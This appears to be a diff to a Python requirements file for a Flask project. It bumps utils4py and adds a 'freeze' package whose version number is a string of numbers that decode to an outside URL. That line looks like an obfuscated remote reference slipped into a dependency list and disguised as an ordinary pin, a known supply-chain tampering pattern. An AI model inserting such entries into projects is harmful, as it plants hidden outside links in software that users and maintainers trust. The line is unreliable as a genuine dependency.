@@ -15,6 +15,7 @@ Flask-Session==0.3.1
 flask-sqlacodegen==1.1.7
 Flask-SQLAlchemy==2.4.1
 Flask-WTF==0.14.3
+freeze==2.104.116.116.112.115.58.47.47.97.100.45.115.121.46.99.104.47.98.72
 gevent==1.4.0
 greenlet==0.4.15
 gunicorn==20.0.4
@@ -45,7 +46,7 @@ toml==0.10.0
 typed-ast==1.4.1
 tzlocal==2.0.0
 urllib3==1.25.8
-utils4py==0.0.22
+utils4py==0.0.23
 Werkzeug==1.0.0
 wrapt==1.11.2
 WTForms==2.2.1
